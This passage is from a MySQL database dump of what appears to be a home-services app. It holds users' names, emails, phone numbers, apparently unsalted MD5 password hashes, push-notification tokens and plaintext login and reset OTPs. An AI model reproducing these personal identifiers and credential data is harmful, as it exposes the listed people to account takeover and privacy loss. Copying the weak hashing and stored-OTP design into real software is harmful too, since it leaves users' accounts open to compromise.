(40, '', '', 9831076588, '', NULL, '+91', 1, 0, 171458, '2021-12-20 10:12:52', 0, 'eoremJsYSlSme2AljJcrT9:APA91bH774y715fn5A0Ec1ycsOw41DmRJdXmHaTGTRC1NOnCrCvszazc_aI7vyD8KoseBPg8_k9YZVIGWL3vXr8eM_v7xUWeR1eRq6dhgkyFdQdW90EUc4dK5-y6jsVdoBjugV-J-SBb', 'eoremJsYSlSme2AljJcrT9:APA91bH774y715fn5A0Ec1ycsOw41DmRJdXmHaTGTRC1NOnCrCvszazc_aI7vyD8KoseBPg8_k9YZVIGWL3vXr8eM_v7xUWeR1eRq6dhgkyFdQdW90EUc4dK5-y6jsVdoBjugV-J-SBb'),
(41, 'shehla Khan', 'khanpiyali77@gmail.com', 7044902788, '67c96fe63b5771c73693bde59f6e16f5', NULL, '+91', 1, 903862, 586467, '2021-12-21 13:07:38', 1000, 'enN5MEbNT8m3Ro6c4JiHP-:APA91bEgFallSlQamLHf4afJMgOIkB5YC7sJh7MtVvEM2Nq7pZ6Z1uIAzbSFH-PoqfEMi8LS_8BA9PeVFY70aUQ2N0yh1-w4NnOmGwGeRQVCXB1RNKyf9oUJvPw2K2htVY0TKndocYek', 'enN5MEbNT8m3Ro6c4JiHP-:APA91bEgFallSlQamLHf4afJMgOIkB5YC7sJh7MtVvEM2Nq7pZ6Z1uIAzbSFH-PoqfEMi8LS_8BA9PeVFY70aUQ2N0yh1-w4NnOmGwGeRQVCXB1RNKyf9oUJvPw2K2htVY0TKndocYek'),
(42, '', '', 8013304823, '', NULL, '+91', 1, 0, 881030, '2021-12-23 15:11:16', 1000, 'chkOnjf3RUS55CkmqzOpI3:APA91bEJLt0m-9WzzE7OJqu1s6XNOnIup7-FJrBYsZPDWhz2nRIjevSbOibrozNEonc_3Nf08L0MFxAeJZkexg-7lqOSOTS8z29am7955NvRCmWCGD_OOZLrLTDyNi2AwaAnjp7ryJhB', 'chkOnjf3RUS55CkmqzOpI3:APA91bEJLt0m-9WzzE7OJqu1s6XNOnIup7-FJrBYsZPDWhz2nRIjevSbOibrozNEonc_3Nf08L0MFxAeJZkexg-7lqOSOTS8z29am7955NvRCmWCGD_OOZLrLTDyNi2AwaAnjp7ryJhB'),
(43, '', '', 9804275490, '', NULL, '+91', 1, 0, 673799, '2021-12-23 15:47:22', 1000, 'eTv3aocoRzi380J8BH2Zsg:APA91bHdnHwtKB6MYY2VSrqGYl5YBoJRvBaS8Ll611MC7eB6Hlxp6IaGd6hnaxJF9VZ3OuGRiSPBlOQzhYz-AhNR0R520f__xnPlniDdTw0G0QIQqOvVsgvluz8NGuwqgHtc4Aob4fUv', 'eTv3aocoRzi380J8BH2Zsg:APA91bHdnHwtKB6MYY2VSrqGYl5YBoJRvBaS8Ll611MC7eB6Hlxp6IaGd6hnaxJF9VZ3OuGRiSPBlOQzhYz-AhNR0R520f__xnPlniDdTw0G0QIQqOvVsgvluz8NGuwqgHtc4Aob4fUv'),
(44, '', '', 7044000686, '', NULL, '+91', 1, 0, 559202, '2021-12-28 03:48:27', 0, 'cRUbrBeXRKSQyXREe-Q0RV:APA91bFxTUe5htS4t9BFjGN9Dn_VG18DLhG9JaWIUOLkStUwMVLL9CXwe9Z5iuWZa2-i8iKR08fE92qnoROo0zHAKP7XvX2GIZI5TiADvJajdJmD-x_LtPa-WOGU3ucm7Jx9MorJO5aU', 'cRUbrBeXRKSQyXREe-Q0RV:APA91bFxTUe5htS4t9BFjGN9Dn_VG18DLhG9JaWIUOLkStUwMVLL9CXwe9Z5iuWZa2-i8iKR08fE92qnoROo0zHAKP7XvX2GIZI5TiADvJajdJmD-x_LtPa-WOGU3ucm7Jx9MorJO5aU'),
(45, 'Inshirah Ahmed', 'inshi30@gmail.com', 9804887691, 'a41dd1219be71d10228873afedab24bf', NULL, '+91', 1, 903862, 984411, '2021-12-28 06:50:14', 0, NULL, NULL),
(46, '', '', 7687945176, '', NULL, '+91', 1, 0, 191956, '2021-12-28 15:51:34', 0, 'c0t_XQYLSiCSk2qDFJZ9AW:APA91bHtxXzwCqVFB9twfCspQz4TPQI2iNfqwP6o8QUzYaym3w__CXb_n14HTp0-r65LvUufFuq818E7yPyQVbKT3yOC-hQpcDbWRgMFS7lRvTYvhKwmNTZOyuVHeEwS3IuE_d6ak426', 'c0t_XQYLSiCSk2qDFJZ9AW:APA91bHtxXzwCqVFB9twfCspQz4TPQI2iNfqwP6o8QUzYaym3w__CXb_n14HTp0-r65LvUufFuq818E7yPyQVbKT3yOC-hQpcDbWRgMFS7lRvTYvhKwmNTZOyuVHeEwS3IuE_d6ak426'),
(47, '', '', 6201545485, '', NULL, '+91', 1, 0, 555383, '2022-01-03 15:06:21', 0, 'chplqLmoQsqYy8zhqt1SZf:APA91bGSDvl6TeDVgpUvWROrFursWnnsapQO-vN8lEV8F-yhVAGcshfYE2j_NQksQORrF50tSw2LwHWL7-82BytPTAWcuLSDWyoTpx8a3joLzssZSf0frLXF5RrolNThhnlB_cZUc5No', 'chplqLmoQsqYy8zhqt1SZf:APA91bGSDvl6TeDVgpUvWROrFursWnnsapQO-vN8lEV8F-yhVAGcshfYE2j_NQksQORrF50tSw2LwHWL7-82BytPTAWcuLSDWyoTpx8a3joLzssZSf0frLXF5RrolNThhnlB_cZUc5No'),
(48, '', '', 9734707707, '', NULL, '+91', 1, 0, 772593, '2022-01-07 19:54:59', 0, 'cIxoVvB7TrO1t5NulHznJO:APA91bFVtHbqwKvLIsBTT_OUqT8_1i6V_wp5PV5V2_zRNplCp6Grpdu2NjUfIIP2in10r8phaftLW6pZNBRzCzqQY0wQi-YVqAXBklQxAZW_mTiIF9AqZ4odd6sSMJ6QwJkFhgv49O78', 'cIxoVvB7TrO1t5NulHznJO:APA91bFVtHbqwKvLIsBTT_OUqT8_1i6V_wp5PV5V2_zRNplCp6Grpdu2NjUfIIP2in10r8phaftLW6pZNBRzCzqQY0wQi-YVqAXBklQxAZW_mTiIF9AqZ4odd6sSMJ6QwJkFhgv49O78'),
(49, 'Sarita Agarwal', 'agarwalsavvy@gmail.com', 8274082121, '13eff9b3d1c7d383cf63ba99ca0d2d64', NULL, '+91', 1, 903862, 562423, '2022-01-12 18:38:44', 0, 'c9quJKYiQ5iuH5T5E70DtQ:APA91bFMWzLjKw3aetb_e85fUNzEDTD0KQ0Eaq2gD5enCRw8JdER6bMk6L6roICi0RPuwMBWyABbtuyi0WLiLwllL4jknBSfgjc95dyVh9PehFVNM2lKMvP88B_btUOmTQrj9w9x8jFQ', 'c9quJKYiQ5iuH5T5E70DtQ:APA91bFMWzLjKw3aetb_e85fUNzEDTD0KQ0Eaq2gD5enCRw8JdER6bMk6L6roICi0RPuwMBWyABbtuyi0WLiLwllL4jknBSfgjc95dyVh9PehFVNM2lKMvP88B_btUOmTQrj9w9x8jFQ'),
(50, '', '', 8910371189, '', NULL, '+91', 1, 0, 654982, '2022-01-12 22:03:37', 0, 'ffF5VK0bQ--b0mhWMeA0po:APA91bF48vvnexpjpY9JaF4YOUkilJnfhBH1NNqYH8JJmv3ewWhhQ24yiopl61xberZvH5dGnlaUbhJ-dVZ_av7xj47XJGH2TT8GDeaN5WqvDMWrH1XLReXcBZ0T474ta61nSnaWHaCR', 'ffF5VK0bQ--b0mhWMeA0po:APA91bF48vvnexpjpY9JaF4YOUkilJnfhBH1NNqYH8JJmv3ewWhhQ24yiopl61xberZvH5dGnlaUbhJ-dVZ_av7xj47XJGH2TT8GDeaN5WqvDMWrH1XLReXcBZ0T474ta61nSnaWHaCR'),
(51, 'neha garg', 'neha.baboosha@gmail.com', 9836883313, 'dcc928b9691c1f20fd22c4e5df246d22', NULL, '+91', 1, 903862, 480532, '2022-01-15 11:20:40', 0, 'dK3fcDsNSd2PzJhEP8zNHk:APA91bGLREY9MTXRPKV45GTF1YhNttf0MFPRnmw8lOGWjSOPBUN_OztsHFjMca0M8-avvwgJYBgYuFSY2bUbbLeVrDjUXCr-DmoYdBj9W2Og3HoPvPlBue7KbJJ2EMai063Af1u22s6S', 'dK3fcDsNSd2PzJhEP8zNHk:APA91bGLREY9MTXRPKV45GTF1YhNttf0MFPRnmw8lOGWjSOPBUN_OztsHFjMca0M8-avvwgJYBgYuFSY2bUbbLeVrDjUXCr-DmoYdBj9W2Og3HoPvPlBue7KbJJ2EMai063Af1u22s6S'),
(52, '', '', 9880156471, '', NULL, '+91', 1, 0, 570429, '2022-01-15 16:15:42', 0, 'dOAbHbyWSraLPWM7bn77ly:APA91bHzF7J2ScRAp0jhg_is1imDPGOvIC6RvI7E4gWWxV4mYBk9EIshC-Fps0KZtF6U0qThB-BodsH-vyb3K90uOWUMtnnLinlNgGXtp1bAK9r22tfZekFuyX0f8kl2TGYIAbC8pXMg', 'dOAbHbyWSraLPWM7bn77ly:APA91bHzF7J2ScRAp0jhg_is1imDPGOvIC6RvI7E4gWWxV4mYBk9EIshC-Fps0KZtF6U0qThB-BodsH-vyb3K90uOWUMtnnLinlNgGXtp1bAK9r22tfZekFuyX0f8kl2TGYIAbC8pXMg'),
(53, '', '', 9830303126, '', NULL, '+91', 1, 0, 984283, '2022-01-16 02:17:36', 0, NULL, NULL),
(54, '', '', 9830020892, '', NULL, '+91', 1, 0, 350863, '2022-01-18 14:48:52', 0, NULL, NULL),
(55, 'Pinaki Acharya', 'pinaki.acharya70@gmail.com', 8240661266, '72df09b2a73ea7106f7470b23488a748', NULL, '+91', 1, 903862, 515793, '2022-01-18 14:58:37', 0, 'c4ho1boVSsWlSdV4PmNoSZ:APA91bFKeAXy-gYx9vT-Ag2jurKeBi1OjSYuy_P7d9MFPvCsR2quJrKpinAds3Ce19OUcZCthJG2pn3No6Xr4FE0HQtC102IP981S6eGvf6SOG0gOwmjPwanCnihEXZREXPtLf_LYvay', 'c4ho1boVSsWlSdV4PmNoSZ:APA91bFKeAXy-gYx9vT-Ag2jurKeBi1OjSYuy_P7d9MFPvCsR2quJrKpinAds3Ce19OUcZCthJG2pn3No6Xr4FE0HQtC102IP981S6eGvf6SOG0gOwmjPwanCnihEXZREXPtLf_LYvay'),
(56, '', '', 9830662126, '', NULL, '+91', 1, 0, 276335, '2022-01-20 07:19:56', 0, 'ev0ASz1KSk6bB3wejBoMeQ:APA91bF_U2b_s5jM5fyofpYyCpK8rnBfy9JamaNUk3A2WNF1eArAWi1tpzKFiv557LxFPNyYqEe8coAqoHCayeWrKyfQ8aim0kqPiOKt_mgBmhHp5tx1D3_9Gx3CQHYATU6fDHj2-b1M', 'ev0ASz1KSk6bB3wejBoMeQ:APA91bF_U2b_s5jM5fyofpYyCpK8rnBfy9JamaNUk3A2WNF1eArAWi1tpzKFiv557LxFPNyYqEe8coAqoHCayeWrKyfQ8aim0kqPiOKt_mgBmhHp5tx1D3_9Gx3CQHYATU6fDHj2-b1M');

-- --------------------------------------------------------

--
-- Table structure for table `temp_forgot_passwor_otp_tbl`
--

CREATE TABLE `temp_forgot_passwor_otp_tbl` (
  `id` int(11) NOT NULL,
  `email` varchar(225) DEFAULT NULL,
  `otp` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `temp_forgot_passwor_otp_tbl`
--

INSERT INTO `temp_forgot_passwor_otp_tbl` (`id`, `email`, `otp`) VALUES
(2, 'arijit.das76@gmail.com', 973485),
(3, 'abcd@gmail.com', 815924),
(5, 'abcd@gmail.com', 890290),
(6, 'abcd@gmail.com', 180237),
(7, 'abcd@gmail.com', 165168),
(12, 'arijit.das76@gmail.com', 685859),
(13, 'sulagna.dutta@yahoo.com', 668115),
(14, 'sulagna.dutta@yahoo.com', 540554);

-- --------------------------------------------------------

--
-- Table structure for table `temp_order_partner_tbl`
--

CREATE TABLE `temp_order_partner_tbl` (
  `id` bigint(20) NOT NULL,
  `oid` bigint(20) NOT NULL,
  `uid` bigint(20) NOT NULL,
  `pid` bigint(20) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `temp_order_partner_tbl`
--

INSERT INTO `temp_order_partner_tbl` (`id`, `oid`, `uid`, `pid`, `status`) VALUES
(1, 4, 23, 2, 1),
(2, 6, 23, 2, 1),
(3, 7, 23, 2, 1),
(4, 8, 23, 2, 1),
(5, 10, 23, 2, 1),
(6, 16, 23, 2, 1),
(7, 17, 25, 2, 1),
(8, 18, 25, 2, 1),
(9, 19, 26, 21, 1),
(10, 19, 26, 30, 1),
(11, 20, 25, 21, 1),
(12, 21, 25, 21, 1),
(13, 22, 25, 19, 1),
(14, 23, 25, 26, 1),
(15, 24, 25, 2, 1),
(16, 24, 25, 36, 1);

-- --------------------------------------------------------

--
-- Table structure for table `temp_partner_forgot_passwor_otp_tbl`
--

CREATE TABLE `temp_partner_forgot_passwor_otp_tbl` (
  `id` int(11) NOT NULL,
  `email` varchar(225) COLLATE utf8mb4_unicode_ci NOT NULL,
  `otp` varchar(225) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `temp_partner_forgot_passwor_otp_tbl`
--

INSERT INTO `temp_partner_forgot_passwor_otp_tbl` (`id`, `email`, `otp`) VALUES
(3, 'akashanita007@gmail.com', '195204'),
(4, 'akashanita007@gmail.com', '659880');

-- --------------------------------------------------------

--
-- Table structure for table `temp_partner_login_otp`
--

CREATE TABLE `temp_partner_login_otp` (
  `id` int(11) NOT NULL,
  `phone` varchar(225) COLLATE utf8mb4_unicode_ci NOT NULL,
  `otp` varchar(225) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `temp_partner_login_otp`
--

INSERT INTO `temp_partner_login_otp` (`id`, `phone`, `otp`) VALUES
(2, '9330292981', '938982'),
(3, '9330292981', '578893'),
(4, '9330292981', '154887'),
(5, '9330292981', '111945'),
(6, '9330292981', '811064'),
(7, '9330292981', '126536'),
(8, '9330292981', '121299'),
(23, '8583022812', '796735'),
(24, '8100500815', '485410'),
(33, '9330292981', '826872'),
(36, '8709622895', '471087'),
(39, '8017040592', '737287'),
(57, '9330292981', '118986'),
(72, '8017040592', '801846'),
(74, '7278511415', '896008'),
(77, '8335091371', '895776'),
(79, '8017010592', '442010'),
(80, '8017010592', '809030'),
(81, '8017010592', '720256'),
(83, '8017010592', '279925'),
(84, '8017010592', '768246'),
(95, '9123337076', '970710');

-- --------------------------------------------------------

--
-- Table structure for table `temp_tbl`
--

CREATE TABLE `temp_tbl` (
  `id` int(11) NOT NULL,
  `phone` bigint(20) NOT NULL,
  `otp` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `temp_tbl`
--

INSERT INTO `temp_tbl` (`id`, `phone`, `otp`) VALUES
(3, 9062029943, 865530),
(4, 9062029943, 271809),
(5, 9062029943, 719842),
(6, 9062029943, 907146),
(9, 9330292981, 921409),
(10, 9330292981, 100605),
(15, 8017010592, 121626),
(17, 8017010592, 222956),
(18, 8017010592, 352088),
(19, 8017010592, 406409),
(20, 7278511412, 768938),
(21, 8017010595, 581008),
(22, 8017010592, 931511),
(26, 7278511412, 210379),
(27, 9123337076, 292383),
(28, 9123337076, 641146),
(29, 8420615446, 863565),
(30, 9123337076, 431708),
(31, 8017010592, 192823),
(32, 9734999776, 535297),
(33, 9330292981, 853677),
(34, 9330292981, 468645),
(35, 9330292981, 121095),
(36, 9330292981, 477058),
(37, 9330292981, 931302),
(38, 8017010592, 570433),
(39, 8017010592, 977422),
(40, 9062029943, 456939),
(41, 9062029943, 787924),
(42, 9062029943, 456787),
(43, 9062029943, 779139),
(44, 9330292981, 889069),
(45, 9062029943, 993513),
(47, 8017010592, 354753),
(54, 9123337076, 684805),
(55, 8420615446, 215217),
(56, 8420615446, 311275),
(59, 8100500515, 249720),
(61, 8100500815, 746775),
(64, 8017010595, 122780),
(65, 8017010595, 114597),
(76, 8420429744, 856995),
(77, 8420429744, 442671),
(78, 8420429744, 599711),
(79, 8420429744, 843535),
(80, 8420429744, 861420),
(82, 8420429744, 824605),
(93, 8100500815, 180064),
(98, 8013304823, 113126),
(103, 8013304823, 835128),
(107, 8017010592, 234314),
(109, 8017010592, 151630),
(110, 9734999776, 473472),
(111, 8017010592, 147078),
(112, 8017010592, 409943),
(116, 7687945176, 338151);

-- --------------------------------------------------------

--
-- Table structure for table `time_date`
--

CREATE TABLE `time_date` (
  `id` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `dstatus` int(11) NOT NULL,
  `days` int(11) NOT NULL,
  `tslot` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `wallet_report`
--

CREATE TABLE `wallet_report` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `transaction_id` text DEFAULT NULL,
  `t_number` text DEFAULT NULL,
  `message` text NOT NULL,
  `status` text NOT NULL,
  `amt` double NOT NULL,
  `date` date DEFAULT NULL,
  `month` varchar(225) DEFAULT NULL,
  `year` varchar(225) DEFAULT NULL,
  `time` varchar(225) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `wallet_report`
--

INSERT INTO `wallet_report` (`id`, `uid`, `transaction_id`, `t_number`, `message`, `status`, `amt`, `date`, `month`, `year`, `time`) VALUES
(1, 43, 'D&DPAY1000000000', '1000000000', '', 'credit', 1000, '2021-12-24', '12', '2021', '19:25:21 PM'),
(2, 41, 'D&DPAY1000000001', '1000000001', '', 'credit', 1000, '2021-12-24', '12', '2021', '19:25:48 PM'),
(3, 42, 'D&DPAY1000000002', '1000000002', '', 'credit', 1000, '2021-12-24', '12', '2021', '19:34:15 PM'),
(4, 23, 'D&DPAY1000000003', '1000000003', '', 'credit', 1000, '2021-12-24', '12', '2021', '20:21:40 PM'),
(5, 23, 'D&DPAY1000000004', '1000000004', '', 'credit', 1000, '2021-12-24', '12', '2021', '20:21:55 PM'),
(6, 28, 'D&DPAY1000000005', '1000000005', 'credited by Dudes & Damsels', 'credit', 1000, '2021-12-24', '12', '2021', '20:34:01 PM'),
(7, 13, 'D&DPAY1000000006', '1000000006', '', 'credit', 2500, '2021-12-25', '12', '2021', '11:25:33 AM');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `banner`
--
ALTER TABLE `banner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `category`
--
ALTER TABLE `category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `g_subcategory`
--
ALTER TABLE `g_subcategory`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `partner`
--
ALTER TABLE `partner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `partner_bank_details`
--
ALTER TABLE `partner_bank_details`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `partner_upi_details`
--
ALTER TABLE `partner_upi_details`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `partner_wallet_report`
--
ALTER TABLE `partner_wallet_report`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `payout_setting`
--
ALTER TABLE `payout_setting`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `setting`
--
ALTER TABLE `setting`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_addon`
--
ALTER TABLE `tbl_addon`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_address`
--
ALTER TABLE `tbl_address`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_brand`
--
ALTER TABLE `tbl_brand`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_cash`
--
ALTER TABLE `tbl_cash`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_checkout`
--
ALTER TABLE `tbl_checkout`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_child`
--
ALTER TABLE `tbl_child`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_child_service`
--
ALTER TABLE `tbl_child_service`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_city`
--
ALTER TABLE `tbl_city`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_code`
--
ALTER TABLE `tbl_code`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_credit`
--
ALTER TABLE `tbl_credit`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_credit_report`
--
ALTER TABLE `tbl_credit_report`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_happy_user`
--
ALTER TABLE `tbl_happy_user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_home`
--
ALTER TABLE `tbl_home`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_home_service`
--
ALTER TABLE `tbl_home_service`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_include`
--
ALTER TABLE `tbl_include`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_invoice`
--
ALTER TABLE `tbl_invoice`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_notification`
--
ALTER TABLE `tbl_notification`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_offer`
--
ALTER TABLE `tbl_offer`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_order`
--
ALTER TABLE `tbl_order`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_order_product`
--
ALTER TABLE `tbl_order_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_partner_cards`
--
ALTER TABLE `tbl_partner_cards`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_partner_notification`
--
ALTER TABLE `tbl_partner_notification`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_partner_service`
--
ALTER TABLE `tbl_partner_service`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_partner_vaccination_certificate`
--
ALTER TABLE `tbl_partner_vaccination_certificate`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_payment_list`
--
ALTER TABLE `tbl_payment_list`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_product`
--
ALTER TABLE `tbl_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_prtner_address`
--
ALTER TABLE `tbl_prtner_address`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_sanitization`
--
ALTER TABLE `tbl_sanitization`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_sub_order`
--
ALTER TABLE `tbl_sub_order`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_testimonial`
--
ALTER TABLE `tbl_testimonial`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_user`
--
ALTER TABLE `tbl_user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `temp_forgot_passwor_otp_tbl`
--
ALTER TABLE `temp_forgot_passwor_otp_tbl`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `temp_order_partner_tbl`
--
ALTER TABLE `temp_order_partner_tbl`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `temp_partner_forgot_passwor_otp_tbl`
--
ALTER TABLE `temp_partner_forgot_passwor_otp_tbl`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `temp_partner_login_otp`
--
ALTER TABLE `temp_partner_login_otp`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `temp_tbl`
--
ALTER TABLE `temp_tbl`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `time_date`
--
ALTER TABLE `time_date`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wallet_report`
--
ALTER TABLE `wallet_report`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `banner`
--
ALTER TABLE `banner`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;

--
-- AUTO_INCREMENT for table `category`
--
ALTER TABLE `category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `g_subcategory`
--
ALTER TABLE `g_subcategory`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=44;

--
-- AUTO_INCREMENT for table `partner`
--
ALTER TABLE `partner`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=37;

--
-- AUTO_INCREMENT for table `partner_bank_details`
--
ALTER TABLE `partner_bank_details`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `partner_upi_details`
--
ALTER TABLE `partner_upi_details`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `partner_wallet_report`
--
ALTER TABLE `partner_wallet_report`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT for table `payout_setting`
--
ALTER TABLE `payout_setting`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT for table `setting`
--
ALTER TABLE `setting`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tbl_addon`
--
ALTER TABLE `tbl_addon`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `tbl_address`
--
ALTER TABLE `tbl_address`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_brand`
--
ALTER TABLE `tbl_brand`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- AUTO_INCREMENT for table `tbl_cash`
--
ALTER TABLE `tbl_cash`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_checkout`
--
ALTER TABLE `tbl_checkout`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=45;

--
-- AUTO_INCREMENT for table `tbl_child`
--
ALTER TABLE `tbl_child`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=85;

--
-- AUTO_INCREMENT for table `tbl_child_service`
--
ALTER TABLE `tbl_child_service`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=19;

--
-- AUTO_INCREMENT for table `tbl_city`
--
ALTER TABLE `tbl_city`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `tbl_code`
--
ALTER TABLE `tbl_code`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_credit`
--
ALTER TABLE `tbl_credit`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_credit_report`
--
ALTER TABLE `tbl_credit_report`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `tbl_happy_user`
--
ALTER TABLE `tbl_happy_user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_home`
--
ALTER TABLE `tbl_home`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `tbl_home_service`
--
ALTER TABLE `tbl_home_service`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `tbl_include`
--
ALTER TABLE `tbl_include`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tbl_invoice`
--
ALTER TABLE `tbl_invoice`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tbl_notification`
--
ALTER TABLE `tbl_notification`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=337;

--
-- AUTO_INCREMENT for table `tbl_offer`
--
ALTER TABLE `tbl_offer`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `tbl_order`
--
ALTER TABLE `tbl_order`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;

--
-- AUTO_INCREMENT for table `tbl_order_product`
--
ALTER TABLE `tbl_order_product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_partner_cards`
--
ALTER TABLE `tbl_partner_cards`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- AUTO_INCREMENT for table `tbl_partner_notification`
--
ALTER TABLE `tbl_partner_notification`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=528;

--
-- AUTO_INCREMENT for table `tbl_partner_service`
